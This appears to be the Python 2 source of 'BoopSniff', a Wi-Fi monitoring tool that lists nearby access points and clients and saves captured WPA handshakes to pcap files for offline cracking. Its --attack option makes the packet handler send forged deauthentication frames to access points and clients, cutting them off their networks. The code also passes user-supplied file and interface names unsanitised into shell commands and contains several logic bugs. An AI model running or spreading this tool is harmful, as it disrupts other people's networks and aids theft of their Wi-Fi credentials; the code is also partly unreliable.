#!/usr/bin/env python
# -*- coding: utf-8 -*-

# TODO: Use pyric to change channel. reduces channel change time by 50 - 70%

__year__    = [2016, 2017]
__status__  = "Stable"
__contact__ = "jacobsin1996@gmail.com"

# Imports
import argparse
import logging
import signal

import pyric.pyw as pyw

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from netaddr import *
from os import system, path, getuid, uname
from random import choice
from scapy.contrib.wpa_eapol import WPA_key
from scapy.all import *
from sys import exit, stdout, stderr
from threading import Thread
from time import sleep, time

conf.verb = 0

# CLASSES
class c:
    H  = "\033[95m" # Magenta
    B  = "\033[94m" # Blue
    W  = "\033[93m" # Yellow
    G  = "\033[92m" # Green
    F  = "\033[91m" # Red
    E  = "\033[0m"  # Clear
    Bo = "\033[1m"  # Bold

class Configuration:
    def __init__(self):
        self.check_root()
        self.check_op()
        self.start_time = time()

        self.aps = {}
        self.cls = {}

        self.hidden = []

        self.mac_filter_channel = ""
        self.cap_message = ""

        self.print_flag   = True
        self.channel_flag = True

        return

    def user_force_variables_static(self):
        # Use this to force certain attributes about boop
        return

    def parse_interface(self, interface):
        if interface in pyw.interfaces() and pyw.modeget(interface) == "monitor":
            self.interface = interface
        else:
            print(c.F + " [-] Non Monitor card selected.")
            exit(0)
        return

    def parse_report(self, report):
        if not report:
            self.report = report
        else:
            try:
                system("touch "+report)
                self.report = open(report, "w")
            except:
                print(c.F+" [-] Report Location Invalid.")
                self.report = None
        return

    def parse_freq(self, freq):
        self.frequency = freq
        return

    def parse_channel(self, channel):
        _5_channels_ = [
            36, 40, 44,
            48, 52, 56,
            60, 64, 100,
            104, 108, 112,
            116, 132, 136,
            140, 149, 153,
            157, 161, 165
        ]

        if channel == None:
            if self.frequency == 2:
                self.hop = True
            elif self.frequency == 5:
                self.hop = True
            else:
                print(c.F+" [-] Channel Setting incorrect.")
                exit(0)

            self.channel = None

        elif channel != None:
            if self.frequency == 2 and channel in xrange(1, 12):
                self.hop = False
            elif self.frequency == "5" and channel in _5_channels_:
                self.hop = False
            else:
                print(c.F+" [-] Channel Setting incorrect."+c.E)
                exit(0)

            self.channel = channel

        return

    def parse_kill(self, kill):
        if kill != False:
            commandlist = [
                "service avahi-daemon stop",
                "service network-manager stop",
                "pkill wpa_supplicant",
                "pkill dhclient"
                ]

            for item in commandlist:
                try:
                    system("sudo %s" % (item))
                except:
                    pass
        return

    def parse_unassociated(self, un):
        self.unassociated = un
        return

    def parse_mac_filter(self, mac_filter):
        self.mac_filter = mac_filter
        return

    def parse_attack(self, attack):
        self.attack = attack
        return

    def parse_skip(self, skip):
        self.skip = skip
        return

    def parse_args(self):
        parser = argparse.ArgumentParser()

        parser.add_argument(
            '--version',
            action='version',
            version="{0}{1}".format(c.G, "Version: 0.16.3"))

        parser.add_argument(
            "-i",
            "--interface",
            action="store",
            dest="interface",
            help="select an interface",
            required=True)

        parser.add_argument(
            "-r",
            "--report",
            action="store",
            default=None,
            dest="report",
            help="select a report location")

        parser.add_argument(
            "-f",
            "--frequency",
            action="store",
            default="2",
            dest="freq",
            type=int,
            help="select a frequency (2/5)",
            choices=[2, 5])

        parser.add_argument(
            "-c",
            "--channel",
            action="store",
            default=None,
            dest="channel",
            type=int,
            help="select a channel")

        parser.add_argument(
            "-k",
            "--kill",
            action="store_true",
            dest="kill",
            help="sudo kill interfering processes.")

        parser.add_argument(
            "-u",
            "--unassociated",
            action="store_true",
            dest="unassociated",
            help="Whether to show unassociated clients.")

        parser.add_argument(
            "-a",
            "--accesspoint",
            action="store",
            default=None,
            dest="access_mac",
            help="Command for a specific mac addr.")

        parser.add_argument(
            "--attack",
            action="store_true",
            default=False,
            dest="attack",
            help="Launch Deauth attack while sniffing.")

        parser.add_argument(
            "-s",
            "--skip",
            action="store",
            default=None,
            dest="skip",
            help="Mac to not deauth (Usually your own...)")

        results = parser.parse_args()

        self.parse_interface(results.interface)
        self.parse_report(results.report)
        self.parse_freq(results.freq)
        self.parse_channel(results.channel)
        self.parse_kill(results.kill)
        self.parse_unassociated(results.unassociated)
        self.parse_mac_filter(results.access_mac)
        self.parse_attack(results.attack)
        self.parse_skip(results.skip)

        self.user_force_variables_static()
        return

    def check_root(self):
        if getuid() != 0:
            print(c.F+" [-] User is not Root.")
            exit()

        return

    def check_op(self):
        if uname()[0].startswith("Linux") and not "Darwin" not in uname()[0]:
            print(c.F+" [-] Wrong OS.")
            exit()

        return


class Access_Point:
    def __init__(self, ssid, enc, ch, mac, ven, sig):
        self.mssid = ssid
        self.menc = enc
        self.mch = ch
        self.mmac = mac
        self.mven = ven[:8]
        self.msig = sig
        self.mbeacons = 1
        return

    def update_ssid(self, ssid):
        self.mssid = ssid
        return


class Client:
    def __init__(self, mac, bssid, rssi):
        self.mmac   = mac
        self.mbssid = bssid
        self.msig   = rssi
        self.mnoise = 0
        return


# HANDLER
def get_rssi(decoded):
    rssi = int(-(256 - ord(decoded[-2:-1])))

    if rssi not in xrange(-100, 0):
        rssi = (-(256 - ord(decoded[-4:-3])))

    if rssi < -100:
        return -1
    return rssi


def channel_hopper(configuration):
    interface = configuration.interface
    frequency = configuration.frequency

    if frequency == 2:
        __FREQS__ = {
            "2.412": 1, "2.417": 2, "2.422": 3,
            "2.427": 4, "2.432": 5, "2.437": 6,
            "2.442": 7, "2.447": 8, "2.452": 9,
            "2.457": 10, "2.462": 11
            }

    elif frequency == 5:
        __FREQS__ = {
            "5.180": 36, "5.200": 40, "5.220": 44,
            "5.240": 48, "5.260": 52, "5.280": 56,
            "5.300": 60, "5.320": 64, "5.500": 100,
            "5.520": 104, "5.540": 108, "5.560": 112,
            "5.580": 116, "5.660": 132, "5.680": 136,
            "5.700": 140, "5.745": 149, "5.765": 153,
            "5.785": 157, "5.805": 161, "5.825": 165
        }

    while configuration.channel_flag == True:
        if configuration.mac_filter_channel != "":
            channel = __FREQS__.keys()[__FREQS__.values().index(configuration.mac_filter_channel)]
            system("sudo iwconfig "+interface+" freq "+channel+"G")
            configuration.channel = configuration.mac_filter_channel
            break

        channel = str(choice(__FREQS__.keys()))
        system("sudo iwconfig "+interface+" freq "+channel+"G")

        configuration.channel = __FREQS__[channel]
        sleep(2.5)
    return


def get_access_points(AP):
    return [
        configuration.aps[AP][0].mmac,
        configuration.aps[AP][0].menc,
        configuration.aps[AP][0].mch,
        configuration.aps[AP][0].mven,
        configuration.aps[AP][0].msig,
        configuration.aps[AP][0].mbeacons,
        configuration.aps[AP][0].mssid[:15]
    ]


def get_clients():
    clients = []
    for cl in configuration.cls:
        try:
            if len(configuration.aps[configuration.cls[cl].mbssid][0].mssid) > 0:
                clients.append([
                    configuration.cls[cl].mmac,
                    configuration.aps[configuration.cls[cl].mbssid][0].mmac,
                    configuration.cls[cl].mnoise,
                    configuration.cls[cl].msig,
                    configuration.aps[configuration.cls[cl].mbssid][0].mssid
                ])
        except:
            pass
    return clients


def get_un_clients():
    clients = []
    for cl in configuration.cls:
        try:
            clients.append([
                configuration.cls[cl].mmac,
                configuration.aps[configuration.cls[cl].mbssid][0].mmac,
                configuration.cls[cl].mnoise,
                configuration.cls[cl].msig,
                configuration.aps[configuration.cls[cl].mbssid][0].mssid
            ])

        except:
            clients.append([
                configuration.cls[cl].mmac,
                "",
                configuration.cls[cl].mnoise,
                configuration.cls[cl].msig,
                ""
            ])
    return clients


def printer_thread():
    typetable = "simple"
    timeout = 2.1

    sleep(timeout)

    while configuration.print_flag == True:
        start = time()
        wifis = list(map(get_access_points, configuration.aps))
        wifis.sort(key=lambda x: (x[6]))

        if configuration.unassociated == True:		# print all clients no matter what
            clients = get_un_clients()
        else:
            clients = get_clients()	     		    # only print associated clients

        clients.sort(key=lambda x: (x[4]))

        time_elapsed = int(time() - configuration.start_time)

        hours = time_elapsed / 3600
        mins = (time_elapsed % 3600) / 60
        secs = time_elapsed % 60
        if hours > 0:
            printable_time = "%d h %d m %d s" % (hours, mins, secs)

        elif mins > 0:
            printable_time = "%d m %d s" % (mins, secs)

        else:
            printable_time = "%d s" % secs

        stderr.write("\x1b[2J\x1b[H")

        print("%s[+] %sTime: %s[%s%s%s] %sSlithering: %s[%s%s%s] %s%s" % (c.G, c.E, c.B, c.W, printable_time, c.B, c.E, c.B, c.W, configuration.channel, c.B, c.E, configuration.cap_message))

        print( "\r\n{0}{1}{2}{3}{4}{5}{6}".format(c.F+"Mac Addr".ljust(19, " "), "Enc".ljust(10, " "), "Ch".ljust(4, " "), "Vendor".ljust(9, " "), "Sig".ljust(5, " "), "Beacons".ljust(8, " "), "SSID"+c.E) )
        for item in wifis:
            print( " {0}{1}{2:<4}{3}{4:<5}{5:<8}{6}".format(item[0].ljust(19, " "), item[1].ljust(10, " "), item[2], item[3].ljust(9, " "), item[4], item[5], item[6]) )

        print("\r\n{0}{1}{2}{3}{4}".format(c.F+"Mac".ljust(19, " "), "AP Mac".ljust(19, " "), "Noise".ljust(7, " "), "Sig".ljust(5, " "), "AP SSID"+c.E) )

        for item in clients:
            print( " {0}{1}{2:<7}{3:<5}{4}".format(item[0].ljust(19, " "), item[1].ljust(19, " "), item[2], item[3], item[4]) )

        if timeout < 4.5:
            timeout += .035
        print("\r\n"+c.F+"[Buffer time: "+c.E+str(time()-start)+c.F+"]")

        sleep(timeout)
    return


def sniff_packets(packet):
    if (configuration.mac_filter == None or (packet.addr1 == configuration.mac_filter or packet.addr2 == configuration.mac_filter)):

        if packet.type == 0:
            if packet.subtype == 4 and configuration.unassociated:

                if configuration.cls.has_key(packet.addr2):
                    configuration.cls[packet.addr2].msig = (get_rssi(packet.notdecoded))
                elif check_valid(packet.addr2):
                    configuration.cls[packet.addr2] = Client(packet.addr2, "", get_rssi(packet.notdecoded))
                configuration.cls[packet.addr2].mnoise += 1


            elif packet.subtype == 5 and packet.addr3 in configuration.hidden:
                configuration.aps[packet.addr3][0].update_ssid(packet.info)
                configuration.hidden.remove(packet.addr3)
                configuration.aps[packet.addr3][1]['packets'].append(packet)


            elif packet.subtype == 8:
                source = packet.addr2
                mac = packet.addr3

                if not check_valid(mac):
                    return

                if configuration.aps.has_key(source):
                    configuration.aps[source][0].msig = (get_rssi(packet.notdecoded))
                    configuration.aps[source][0].mbeacons += 1

                    if configuration.attack and configuration.aps[source][0].mbeacons % 50 == 0:
                        send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))

                else:
                    destination = packet.addr1

                    if packet.info and u"\x00" not in "".join([x if ord(x) < 128 else "" for x in packet.info]):
                        name = packet.info.decode("utf-8")
                    else:
                        configuration.hidden.append(mac)
                        name = "< len: "+str(len(packet.info))+" >"

                    p = packet[Dot11Elt]
                    cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                    "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split("+")

                    sec = set()
                    channel = ""

                    while isinstance(p, Dot11Elt):
                        if p.ID == 3:
                            try:
                                channel = ord(p.info)
                            except:
                                pass
                        elif p.ID == 48:
                            if "WPA" in sec:
                                sec.remove("WPA")
                            sec.add("WPA2")
                        elif p.ID == 61:
                            if channel == "":
                                channel = ord(p.info[-int(p.len):-int(p.len)+1])
                        elif p.ID == 221 and p.info.startswith("\x00P\xf2\x01\x01\x00"):
                            if "WPA2" not in sec:
                                sec.add("WPA")

                        p = p.payload

                    if configuration.hop == False and channel != configuration.channel:
                        return

                    if not sec:
                        if "privacy" in cap:
                            sec.add("WEP")
                        else:
                            sec.add("OPEN")

                    if "0050f204104a000110104400010210" in str(packet).encode("hex"):
                        sec.add("WPS")

                    try:
                        oui = ((EUI(mac)).oui).registration().org
                    except:
                        oui = "< NA >"

                    configuration.aps[source] = [Access_Point(
                        name,
                        ":".join(sec),
                        channel,
                        mac,
                        unicode(oui),
                        get_rssi(packet[0].notdecoded)
                        ),
                            {
                                'frame2': None,
                                'frame3': None,
                                'frame4': None,
                                'replay_counter': None,
                                'packets': [packet],
                                'found': False
                            }
                        ]

                    if mac == configuration.mac_filter:
                        configuration.mac_filter_channel = channel

                    if configuration.attack and configuration.aps[mac][0].mbeacons % 100 == 0 and mac != configuration.skip:
                        send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(1))

        elif packet.type in [1, 2]:
            address1 = packet.addr1
            address2 = packet.addr2
            address3 = packet.addr3

            if configuration.aps.has_key(address1):
                if configuration.cls.has_key(address2):

                    if configuration.cls[address2].mbssid != address1:
                        configuration.cls[address2].mssid = (address1)

                    configuration.cls[address2].mnoise += 1
                    configuration.cls[address2].msig = (get_rssi(packet.notdecoded))

                    if configuration.attack and configuration.cls[address2].mnoise % 25 == 0 and address2 != configuration.skip and address1 != configuration.skip:
                        send(Dot11(addr1=address2, addr2=address1, addr3=address1)/Dot11Deauth(), inter=(0.0), count=(1))

                elif check_valid(address2):
                    configuration.cls[address2] = Client(address2, address1, get_rssi(packet.notdecoded))
                    configuration.cls[address2].mnoise += 1

            elif configuration.aps.has_key(address2):
                if configuration.cls.has_key(address1):

                    if configuration.cls[address1].mbssid != address2:
                        configuration.cls[address1].mssid = (address2)

                    configuration.cls[address1].mnoise += 1
                    configuration.cls[address1].msig = (get_rssi(packet.notdecoded))

                    if configuration.attack and configuration.cls[address1].mnoise % 25 == 0 and address1 != configuration.skip and address2 != configuration.skip:
                        send(Dot11(addr1=address1, addr2=address2, addr3=address2)/Dot11Deauth(), inter=(0.0), count=(1))

                elif check_valid(address1):
                    configuration.cls[address1] = Client(address1, address2, get_rssi(packet.notdecoded))
                    configuration.cls[address1].mnoise += 1

                if packet.haslayer(WPA_key):
                    if not configuration.aps.has_key(packet.addr3):
                        return

                    if configuration.aps[packet.addr3][1]['found'] == True:
                        return

                    else:

                        layer = packet.getlayer(WPA_key)

                        if (packet.FCfield & 1):
                            # From DS = 0, To DS = 1
                            STA = packet.addr2
                        elif (packet.FCfield & 2):
                            # From DS = 1, To DS = 0
                            STA = packet.addr1
                        else:
                            return

                        key_info = layer.key_info
                        wpa_key_length = layer.wpa_key_length
                        replay_counter = layer.replay_counter
                        WPA_KEY_INFO_INSTALL = 64
                        WPA_KEY_INFO_ACK = 128
                        WPA_KEY_INFO_MIC = 256
                        # check for frame 2
                        if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0)):
                            configuration.aps[packet.addr3][1]['frame2'] = 1
                            configuration.aps[packet.addr3][1]['packets'].append (packet)
                        # check for frame 3
                        elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK) and (key_info & WPA_KEY_INFO_INSTALL)):
                            configuration.aps[packet.addr3][1]['frame3'] = 1
                            configuration.aps[packet.addr3][1]['replay_counter'] = replay_counter
                            configuration.aps[packet.addr3][1]['packets'].append(packet)
                        # check for frame 4
                        elif ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and configuration.aps[packet.addr3][1]['replay_counter'] == replay_counter):
                            configuration.aps[packet.addr3][1]['frame4'] = 1
                            configuration.aps[packet.addr3][1]['packets'].append (packet)

                        if (configuration.aps[packet.addr3][1]['frame2'] and configuration.aps[packet.addr3][1]['frame3'] and configuration.aps[packet.addr3][1]['frame4']):
                            folder_path = ("pcaps/")
                            filename = (str(configuration.aps[packet.addr3][0].mssid)+"_"+str(packet.addr3)[-5:].replace(":", "")+".pcap")

                            if not os.path.isfile(folder_path+filename):
                                 system("touch "+folder_path+filename)
                                 system("chmod 1777 "+folder_path+filename)

                            wrpcap (folder_path+filename, configuration.aps[packet.addr3][1]['packets'])
                            configuration.aps[packet.addr3][1]['found'] = True
                            configuration.cap_message = (" - [Booped: %s%s%s]" % (c.F, packet.addr3, c.E))

    return


def set_size(height, width):
    stdout.write("\x1b[8;{rows};{cols}t".format(rows=height, cols=width))
    return


def display_art():
    print(c.B+"""
    ____                   _____       _ ________
   / __ )____  ____  ____ / ___/____  (_) __/ __/
  / __  / __ \/ __ \/ __ \\\__ \/ __ \/ / /_/ /_
 / /_/ / /_/ / /_/ / /_/ /__/ / / / / / __/ __/
/_____/\____/\____/ .___/____/_/ /_/_/_/ /_/
                 /_/
    """)
    print(c.H+"     Codename: Inland Taipan\r\n"+c.Bo)
    return


def check_valid(mac=None):
    if not mac:
        return False

    else:
        for item in ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "01:80:c2:00:00:00", "01:00:5e", "01:80:c2", "33:33"]:
            if mac.startswith(item):
                return False
    return True


def create_pcap_filepath():
    if not path.isdir("pcaps"):
        system("mkdir pcaps")
        system("chmod 1777 pcaps/")
    return


def start_sniffer(configuration):
    sniff(iface=configuration.interface, prn=sniff_packets, store=0)
    return


def main():
    def signal_handler(*args):
        configuration.print_flag = False
        configuration.channel_flag  = False

        if configuration.report != None:
            wifis = list(map(get_access_points, configuration.aps))

            clients = list(map(get_clients, configuration.cls))
            clients.sort(key=lambda x: x[4])

            configuration.report.write(tabulate(wifis, headers=["M", "E", "Ch", "V", "S", "B", "SS"], tablefmt="psql")+"\r\n")
            configuration.report.write(tabulate(clients, headers=["M", "AP M", "N", "S", "AP"], tablefmt="psql")+"\r\n")
            configuration.report.close()

        print(c.G+"\r [+] "+c.E+"Commit to Exit.")
        exit(0)
        return 0

    signal.signal(signal.SIGINT, signal_handler)

    if configuration.hop == True:
        Hopper_Thread = Thread(target=channel_hopper, args=[configuration])
        Hopper_Thread.daemon = True
        Hopper_Thread.start()
    else:
        system("iwconfig " + configuration.interface + " channel " + str(configuration.channel))

    Sniffer_Thread = Thread(target=start_sniffer, args=[configuration])
    Sniffer_Thread.daemon = True
    Sniffer_Thread.start()

    printer_thread()

    return 0


if __name__ == "__main__":
    configuration = Configuration()
    configuration.parse_args()
    conf.iface = configuration.interface

    create_pcap_filepath()
    set_size(50, 83)
    display_art()
    
    main()
    # 830: Goal 800
